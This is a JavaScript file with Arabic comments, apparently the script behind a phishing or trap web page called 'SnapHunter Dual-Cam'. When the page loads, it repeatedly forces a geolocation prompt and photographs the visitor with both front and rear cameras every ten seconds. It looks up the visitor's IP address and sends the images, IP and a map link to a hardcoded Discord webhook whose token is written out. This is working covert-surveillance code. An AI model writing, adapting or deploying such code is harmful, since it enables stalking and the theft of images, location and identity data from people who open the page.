'use strict';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;

// 1. جلب IP الجهاز
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch { return "Unknown"; }
}

// 2. إرسال البيانات (صورتين + موقع + IP)
async function sendDualData(frontBlob, backBlob) {
    const ip = await getIP();
    const formData = new FormData();
    
    let content = `📸 **تم التقاط صور من الجهتين!**\n🌐 IP: \`${ip}\` \n`;
    if (userLat) {
        content += `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${userLat},${userLng}) \n`;
    }

    if (frontBlob) formData.append('file1', frontBlob, 'front.png');
    if (backBlob) formData.append('file2', backBlob, 'back.png');
    
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter Dual-Cam"
    }));

    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 3. طلب الموقع بشكل إجباري
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => { userLat = p.coords.latitude; userLng = p.coords.longitude; },
        () => { setTimeout(forceLocation, 1000); },
        { enableHighAccuracy: true }
    );
}

// 4. التقاط صورة من عدسة محددة
async function captureFromSide(side) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: side === 'front' ? "user" : "environment" } 
        });
        video.srcObject = stream;
        
        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(() => {
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا بعد اللقطة
                        resolve(blob);
                    }, 'image/png');
                }, 1000);
            };
        });
    } catch { return null; }
}

// 5. التشغيل الدوري كل 10 ثوانٍ (بسبب وقت التحويل بين الكاميرات)
async function startDualCapture() {
    forceLocation();
    
    setInterval(async () => {
        const frontImg = await captureFromSide('front'); // سيلفي
        const backImg = await captureFromSide('back');   // خلفية
        
        if (frontImg || backImg) {
            sendDualData(frontImg, backImg);
        }
    }, 10000); // زيادة الوقت قليلاً لضمان التبديل بنجاح
}

window.onload = startDualCapture;
